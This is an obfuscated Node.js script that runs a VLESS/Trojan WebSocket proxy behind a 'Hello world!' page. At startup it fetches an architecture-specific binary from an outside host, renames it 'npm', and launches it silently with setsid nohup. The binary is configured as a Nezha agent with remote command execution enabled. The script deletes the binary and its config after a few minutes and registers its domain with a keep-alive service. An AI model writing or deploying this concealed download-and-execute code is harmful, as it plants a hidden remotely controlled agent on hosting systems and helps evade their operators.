const _0x19749b=_0x4441;(function(_0x4ca009,_0x409b0a){const _0x5d8ad8=_0x4441,_0x52cd58=_0x4ca009();while(!![]){try{const _0x1a6012=-parseInt(_0x5d8ad8(0x149))/0x1+parseInt(_0x5d8ad8(0x100))/0x2+parseInt(_0x5d8ad8(0x124))/0x3+parseInt(_0x5d8ad8(0x10e))/0x4*(parseInt(_0x5d8ad8(0x112))/0x5)+-parseInt(_0x5d8ad8(0x133))/0x6*(parseInt(_0x5d8ad8(0xe4))/0x7)+-parseInt(_0x5d8ad8(0x107))/0x8*(parseInt(_0x5d8ad8(0xee))/0x9)+-parseInt(_0x5d8ad8(0x150))/0xa*(parseInt(_0x5d8ad8(0x11f))/0xb);if(_0x1a6012===_0x409b0a)break;else _0x52cd58['push'](_0x52cd58['shift']());}catch(_0x16dd1f){_0x52cd58['push'](_0x52cd58['shift']());}}}(_0x49da,0xc818e));const os=require('os'),http=require(_0x19749b(0xf8)),fs=require('fs'),axios=require('axios'),net=require(_0x19749b(0x14a)),path=require(_0x19749b(0xe9)),crypto=require(_0x19749b(0x12d)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x19749b(0xdf)]||_0x19749b(0x15c),NEZHA_SERVER=process[_0x19749b(0xfd)][_0x19749b(0x152)]||'',NEZHA_PORT=process[_0x19749b(0xfd)][_0x19749b(0x145)]||'',NEZHA_KEY=process['env'][_0x19749b(0x11b)]||'',DOMAIN=process[_0x19749b(0xfd)][_0x19749b(0x131)]||_0x19749b(0xde),AUTO_ACCESS=process['env'][_0x19749b(0x137)]||!![],WSPATH=process[_0x19749b(0xfd)]['WSPATH']||UUID[_0x19749b(0x11a)](0x0,0x8),SUB_PATH=process[_0x19749b(0xfd)][_0x19749b(0x153)]||_0x19749b(0xed),NAME=process[_0x19749b(0xfd)][_0x19749b(0xfa)]||_0x19749b(0xf4),PORT=process[_0x19749b(0xfd)][_0x19749b(0x141)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3baf6f=_0x19749b;try{const _0x377009=await axios[_0x3baf6f(0x132)](_0x3baf6f(0x11c)),_0x44da60=_0x377009[_0x3baf6f(0x10a)];ISP=(_0x44da60[_0x3baf6f(0x14b)]+'-'+_0x44da60[_0x3baf6f(0xe1)])['replace'](/ /g,'_');}catch(_0x16891c){ISP=_0x3baf6f(0xf1);}};GetISP();const httpServer=http[_0x19749b(0x158)]((_0x4472bd,_0x450649)=>{const _0x17fc70=_0x19749b;if(_0x4472bd[_0x17fc70(0x147)]==='/'){const _0x4e77f6=path[_0x17fc70(0xec)](__dirname,_0x17fc70(0x159));fs[_0x17fc70(0xdc)](_0x4e77f6,_0x17fc70(0x122),(_0x17f00a,_0x1759eb)=>{const _0x5c7735=_0x17fc70;if(_0x17f00a){_0x450649['writeHead'](0xc8,{'Content-Type':_0x5c7735(0xeb)}),_0x450649[_0x5c7735(0x13c)](_0x5c7735(0x111));return;}_0x450649[_0x5c7735(0xf9)](0xc8,{'Content-Type':_0x5c7735(0xeb)}),_0x450649[_0x5c7735(0x13c)](_0x1759eb);});return;}else{if(_0x4472bd[_0x17fc70(0x147)]==='/'+SUB_PATH){const _0x4ea4c3=_0x17fc70(0x148)+UUID+'@'+DOMAIN+_0x17fc70(0x101)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x17fc70(0x11d)+WSPATH+'#'+NAME+'-'+ISP,_0x3afd84=_0x17fc70(0x143)+UUID+'@'+DOMAIN+_0x17fc70(0xf5)+DOMAIN+_0x17fc70(0xea)+DOMAIN+_0x17fc70(0x11d)+WSPATH+'#'+NAME+'-'+ISP,_0x127891=_0x4ea4c3+'\x0a'+_0x3afd84,_0x28df83=Buffer[_0x17fc70(0x121)](_0x127891)[_0x17fc70(0x134)](_0x17fc70(0xe6));_0x450649[_0x17fc70(0xf9)](0xc8,{'Content-Type':_0x17fc70(0xe5)}),_0x450649[_0x17fc70(0x13c)](_0x28df83+'\x0a');}else _0x450649[_0x17fc70(0xf9)](0x194,{'Content-Type':_0x17fc70(0xe5)}),_0x450649[_0x17fc70(0x13c)](_0x17fc70(0xf6));}}),wss=new WebSocket[(_0x19749b(0x108))]({'server':httpServer}),uuid=UUID[_0x19749b(0xef)](/-/g,''),DNS_SERVERS=[_0x19749b(0x12f),'1.1.1.1'];function resolveHost(_0x198bd5){return new Promise((_0x347c31,_0x4f923a)=>{const _0x1bb579=_0x4441;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1bb579(0x14d)](_0x198bd5)){_0x347c31(_0x198bd5);return;}let _0x14d59f=0x0;function _0x348c37(){const _0x47c6d9=_0x1bb579;if(_0x14d59f>=DNS_SERVERS['length']){_0x4f923a(new Error(_0x47c6d9(0x139)+_0x198bd5+_0x47c6d9(0x10c)));return;}const _0x10fc8a=DNS_SERVERS[_0x14d59f];_0x14d59f++;const _0x380474='https://dns.google/resolve?name='+encodeURIComponent(_0x198bd5)+'&type=A';axios[_0x47c6d9(0x132)](_0x380474,{'timeout':0x1388,'headers':{'Accept':_0x47c6d9(0x123)}})[_0x47c6d9(0x125)](_0x124054=>{const _0x254fb5=_0x47c6d9,_0x378fe4=_0x124054[_0x254fb5(0x10a)];if(_0x378fe4['Status']===0x0&&_0x378fe4[_0x254fb5(0x103)]&&_0x378fe4[_0x254fb5(0x103)][_0x254fb5(0x154)]>0x0){const _0x5986b0=_0x378fe4[_0x254fb5(0x103)][_0x254fb5(0x110)](_0x21d03c=>_0x21d03c[_0x254fb5(0xe7)]===0x1);if(_0x5986b0){_0x347c31(_0x5986b0[_0x254fb5(0x10a)]);return;}}_0x348c37();})['catch'](_0x2e5743=>{_0x348c37();});}_0x348c37();});}function handleVlessConnection(_0x353bd1,_0x239741){const _0xc3e038=_0x19749b,[_0x5a1fd5]=_0x239741,_0x1ea043=_0x239741[_0xc3e038(0x11a)](0x1,0x11);if(!_0x1ea043[_0xc3e038(0x126)]((_0x250323,_0x614bdd)=>_0x250323==parseInt(uuid['substr'](_0x614bdd*0x2,0x2),0x10)))return![];let _0x4c896d=_0x239741[_0xc3e038(0x11a)](0x11,0x12)[_0xc3e038(0x109)]()+0x13;const _0x501350=_0x239741['slice'](_0x4c896d,_0x4c896d+=0x2)['readUInt16BE'](0x0),_0x2f9cfe=_0x239741['slice'](_0x4c896d,_0x4c896d+=0x1)['readUInt8'](),_0x2db656=_0x2f9cfe==0x1?_0x239741['slice'](_0x4c896d,_0x4c896d+=0x4)[_0xc3e038(0xec)]('.'):_0x2f9cfe==0x2?new TextDecoder()[_0xc3e038(0xf2)](_0x239741[_0xc3e038(0x11a)](_0x4c896d+0x1,_0x4c896d+=0x1+_0x239741[_0xc3e038(0x11a)](_0x4c896d,_0x4c896d+0x1)[_0xc3e038(0x109)]())):_0x2f9cfe==0x3?_0x239741['slice'](_0x4c896d,_0x4c896d+=0x10)[_0xc3e038(0x102)]((_0x26400e,_0xb29fcb,_0x17dcfb,_0x56780c)=>_0x17dcfb%0x2?_0x26400e[_0xc3e038(0xdb)](_0x56780c[_0xc3e038(0x11a)](_0x17dcfb-0x1,_0x17dcfb+0x1)):_0x26400e,[])[_0xc3e038(0xe3)](_0x1f11b5=>_0x1f11b5['readUInt16BE'](0x0)[_0xc3e038(0x134)](0x10))['join'](':'):'';_0x353bd1[_0xc3e038(0x151)](new Uint8Array([_0x5a1fd5,0x0]));const _0x5cc1f7=createWebSocketStream(_0x353bd1);return resolveHost(_0x2db656)['then'](_0x783372=>{const _0x78b2be=_0xc3e038;net[_0x78b2be(0x13e)]({'host':_0x783372,'port':_0x501350},function(){const _0x36eb5b=_0x78b2be;this['write'](_0x239741[_0x36eb5b(0x11a)](_0x4c896d)),_0x5cc1f7['on']('error',()=>{})[_0x36eb5b(0xff)](this)['on'](_0x36eb5b(0x116),()=>{})[_0x36eb5b(0xff)](_0x5cc1f7);})['on'](_0x78b2be(0x116),()=>{});})[_0xc3e038(0x15b)](_0x18a79c=>{net['connect']({'host':_0x2db656,'port':_0x501350},function(){const _0x403577=_0x4441;this[_0x403577(0x113)](_0x239741[_0x403577(0x11a)](_0x4c896d)),_0x5cc1f7['on'](_0x403577(0x116),()=>{})[_0x403577(0xff)](this)['on']('error',()=>{})[_0x403577(0xff)](_0x5cc1f7);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2ac7f9,_0x2fdc3c){const _0x33f209=_0x19749b;try{if(_0x2fdc3c['length']<0x3a)return![];const _0x11ea43=_0x2fdc3c[_0x33f209(0x11a)](0x0,0x38)[_0x33f209(0x134)](),_0x2cb3df=[UUID];let _0x48f27a=null;for(const _0x5a1279 of _0x2cb3df){const _0xb31ef6=crypto['createHash'](_0x33f209(0xf3))[_0x33f209(0x11e)](_0x5a1279)[_0x33f209(0x12c)](_0x33f209(0xf0));if(_0xb31ef6===_0x11ea43){_0x48f27a=_0x5a1279;break;}}if(!_0x48f27a)return![];let _0x3df550=0x38;_0x2fdc3c[_0x3df550]===0xd&&_0x2fdc3c[_0x3df550+0x1]===0xa&&(_0x3df550+=0x2);const _0x19e4f7=_0x2fdc3c[_0x3df550];if(_0x19e4f7!==0x1)return![];_0x3df550+=0x1;const _0x272674=_0x2fdc3c[_0x3df550];_0x3df550+=0x1;let _0x5edd3e,_0x3bc893;if(_0x272674===0x1)_0x5edd3e=_0x2fdc3c[_0x33f209(0x11a)](_0x3df550,_0x3df550+0x4)[_0x33f209(0xec)]('.'),_0x3df550+=0x4;else{if(_0x272674===0x3){const _0x2df441=_0x2fdc3c[_0x3df550];_0x3df550+=0x1,_0x5edd3e=_0x2fdc3c[_0x33f209(0x11a)](_0x3df550,_0x3df550+_0x2df441)[_0x33f209(0x134)](),_0x3df550+=_0x2df441;}else{if(_0x272674===0x4)_0x5edd3e=_0x2fdc3c[_0x33f209(0x11a)](_0x3df550,_0x3df550+0x10)[_0x33f209(0x102)]((_0x182a9f,_0x1aac76,_0x165469,_0x3eb40a)=>_0x165469%0x2?_0x182a9f[_0x33f209(0xdb)](_0x3eb40a[_0x33f209(0x11a)](_0x165469-0x1,_0x165469+0x1)):_0x182a9f,[])[_0x33f209(0xe3)](_0x57a78b=>_0x57a78b[_0x33f209(0x15f)](0x0)[_0x33f209(0x134)](0x10))[_0x33f209(0xec)](':'),_0x3df550+=0x10;else return![];}}_0x3bc893=_0x2fdc3c[_0x33f209(0x15f)](_0x3df550),_0x3df550+=0x2;_0x3df550<_0x2fdc3c['length']&&_0x2fdc3c[_0x3df550]===0xd&&_0x2fdc3c[_0x3df550+0x1]===0xa&&(_0x3df550+=0x2);const _0x3a4882=createWebSocketStream(_0x2ac7f9);return resolveHost(_0x5edd3e)['then'](_0x1481a3=>{const _0x33dd57=_0x33f209;net[_0x33dd57(0x13e)]({'host':_0x1481a3,'port':_0x3bc893},function(){const _0x5695d4=_0x33dd57;_0x3df550<_0x2fdc3c['length']&&this[_0x5695d4(0x113)](_0x2fdc3c[_0x5695d4(0x11a)](_0x3df550)),_0x3a4882['on']('error',()=>{})[_0x5695d4(0xff)](this)['on'](_0x5695d4(0x116),()=>{})['pipe'](_0x3a4882);})['on']('error',()=>{});})[_0x33f209(0x15b)](_0x114abe=>{const _0x124c08=_0x33f209;net[_0x124c08(0x13e)]({'host':_0x5edd3e,'port':_0x3bc893},function(){const _0x3d8d58=_0x124c08;_0x3df550<_0x2fdc3c[_0x3d8d58(0x154)]&&this[_0x3d8d58(0x113)](_0x2fdc3c[_0x3d8d58(0x11a)](_0x3df550)),_0x3a4882['on'](_0x3d8d58(0x116),()=>{})['pipe'](this)['on'](_0x3d8d58(0x116),()=>{})[_0x3d8d58(0xff)](_0x3a4882);})['on'](_0x124c08(0x116),()=>{});}),!![];}catch(_0x553b7f){return![];}}wss['on'](_0x19749b(0x138),(_0x10c9a2,_0x4d2cdc)=>{const _0x429e93=_0x19749b,_0x1a9a35=_0x4d2cdc[_0x429e93(0x147)]||'';_0x10c9a2[_0x429e93(0x155)]('message',_0xa61ba0=>{const _0x5d4c28=_0x429e93;if(_0xa61ba0[_0x5d4c28(0x154)]>0x11&&_0xa61ba0[0x0]===0x0){const _0x47afa7=_0xa61ba0[_0x5d4c28(0x11a)](0x1,0x11),_0x458454=_0x47afa7[_0x5d4c28(0x126)]((_0x3ffe9f,_0xdd6c60)=>_0x3ffe9f==parseInt(uuid[_0x5d4c28(0x136)](_0xdd6c60*0x2,0x2),0x10));if(_0x458454){!handleVlessConnection(_0x10c9a2,_0xa61ba0)&&_0x10c9a2[_0x5d4c28(0x157)]();return;}}!handleTrojanConnection(_0x10c9a2,_0xa61ba0)&&_0x10c9a2[_0x5d4c28(0x157)]();})['on'](_0x429e93(0x116),()=>{});});function _0x49da(){const _0xbdc871=[':443?security=tls&sni=','Not\x20Found\x0a','includes','http','writeHead','NAME','arch','arm64','env','2083','pipe','1913870czQkHl',':443?encryption=none&security=tls&sni=','reduce','Answer','/bin/bash','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','true','4042952pXeYSA','Server','readUInt8','data','https://amd64.ssss.nyc.mn/v1','\x20with\x20all\x20DNS\x20servers','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','78248PFXzTI','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','find','Hello\x20world!','185uGDZfU','write','writeFileSync','2053','error','config.yaml','setsid\x20nohup\x20./npm\x20-s\x20','8443','slice','NEZHA_KEY','https://speed.cloudflare.com/meta','&path=%2F','update','11mjnFCG','443','from','utf8','application/dns-json','4897347ZhKglg','then','every','client_secret:\x20','utf-8','false','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','aarch64','digest','crypto','trim','8.8.4.4','npm\x20download\x20successfully','DOMAIN','get','406062mffwsx','toString','arm','substr','AUTO_ACCESS','connection','Failed\x20to\x20resolve\x20','https://','log','end','https://oooo.serv00.net/add-url','connect','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','post','PORT','listen','trojan://','finish','NEZHA_PORT','npm\x20is\x20running','url','vless://','187883yoXwjF','net','country','https://arm64.ssss.nyc.mn/v1','test','Server\x20is\x20running\x20on\x20port\x20','2087','14619430lkFdeS','send','NEZHA_SERVER','SUB_PATH','length','once','2096','close','createServer','index.html','stream','catch','787d0cdf-bd16-423d-b365-5d409876c363','Automatic\x20Access\x20Task\x20added\x20successfully','\x20-p\x20','readUInt16BE','unlink','concat','readFile','pop','1234.abc.com','UUID','npm','asOrganization','--tls','map','35YcuIwQ','text/plain','base64','type','npm\x20running\x20error:','path','&fp=chrome&type=ws&host=','text/html','join','sub','9Yizdlu','replace','hex','Unknown','decode','sha224','Hug'];_0x49da=function(){return _0xbdc871;};return _0x49da();}const getDownloadUrl=()=>{const _0x1ba232=_0x19749b,_0x52f6fd=os[_0x1ba232(0xfb)]();return _0x52f6fd===_0x1ba232(0x135)||_0x52f6fd===_0x1ba232(0xfc)||_0x52f6fd===_0x1ba232(0x12b)?!NEZHA_PORT?_0x1ba232(0x14c):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1ba232(0x10b):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x1c5cb6=_0x19749b;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4c0ee1=getDownloadUrl(),_0x405ea8=await axios({'method':_0x1c5cb6(0x132),'url':_0x4c0ee1,'responseType':_0x1c5cb6(0x15a)}),_0x2915bf=fs['createWriteStream']('npm');return _0x405ea8[_0x1c5cb6(0x10a)][_0x1c5cb6(0xff)](_0x2915bf),new Promise((_0x31b602,_0x4b9817)=>{const _0x10a13d=_0x1c5cb6;_0x2915bf['on'](_0x10a13d(0x144),()=>{const _0x253f5a=_0x10a13d;console[_0x253f5a(0x13b)](_0x253f5a(0x130)),exec('chmod\x20+x\x20npm',_0x1bfe7c=>{if(_0x1bfe7c)_0x4b9817(_0x1bfe7c);_0x31b602();});}),_0x2915bf['on'](_0x10a13d(0x116),_0x4b9817);});}catch(_0x695372){throw _0x695372;}},runnz=async()=>{const _0x37a271=_0x19749b;try{const _0x567edd=execSync(_0x37a271(0x105),{'encoding':_0x37a271(0x128)});if(_0x567edd[_0x37a271(0x12e)]()!==''){console[_0x37a271(0x13b)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x122f75){}await downloadFile();let _0x1ebbe7='',_0x4a407f=[_0x37a271(0x120),_0x37a271(0x119),_0x37a271(0x156),_0x37a271(0x14f),_0x37a271(0xfe),_0x37a271(0x115)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3d0e79=_0x4a407f[_0x37a271(0xf7)](NEZHA_PORT)?_0x37a271(0xe2):'';_0x1ebbe7=_0x37a271(0x118)+NEZHA_SERVER+':'+NEZHA_PORT+_0x37a271(0x15e)+NEZHA_KEY+'\x20'+_0x3d0e79+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x50d432=NEZHA_SERVER[_0x37a271(0xf7)](':')?NEZHA_SERVER['split'](':')[_0x37a271(0xdd)]():'',_0x279a59=_0x4a407f[_0x37a271(0xf7)](_0x50d432)?_0x37a271(0x106):_0x37a271(0x129),_0x18c6fe=_0x37a271(0x127)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x37a271(0x13f)+_0x279a59+_0x37a271(0x10f)+UUID;fs[_0x37a271(0x114)](_0x37a271(0x117),_0x18c6fe);}_0x1ebbe7=_0x37a271(0x12a);}else{console[_0x37a271(0x13b)](_0x37a271(0x10d));return;}}try{exec(_0x1ebbe7,{'shell':_0x37a271(0x104)},_0x3f5ae7=>{const _0x3f0175=_0x37a271;if(_0x3f5ae7)console[_0x3f0175(0x116)](_0x3f0175(0xe8),_0x3f5ae7);else console['log'](_0x3f0175(0x146));});}catch(_0x1d5dbb){console[_0x37a271(0x116)]('error:\x20'+_0x1d5dbb);}};function _0x4441(_0x300499,_0xaf3f1a){_0x300499=_0x300499-0xdb;const _0x49dad6=_0x49da();let _0x44417c=_0x49dad6[_0x300499];return _0x44417c;}async function addAccessTask(){const _0x23b473=_0x19749b;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0xe3ae93=_0x23b473(0x13a)+DOMAIN;try{const _0x42d5cf=await axios[_0x23b473(0x140)](_0x23b473(0x13d),{'url':_0xe3ae93},{'headers':{'Content-Type':'application/json'}});console['log'](_0x23b473(0x15d));}catch(_0x300d52){}}const delFiles=()=>{const _0x3f4b21=_0x19749b;fs['unlink'](_0x3f4b21(0xe0),()=>{}),fs[_0x3f4b21(0x160)](_0x3f4b21(0x117),()=>{});};httpServer[_0x19749b(0x142)](PORT,()=>{const _0xa38862=_0x19749b;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xa38862(0x14e)+PORT);});
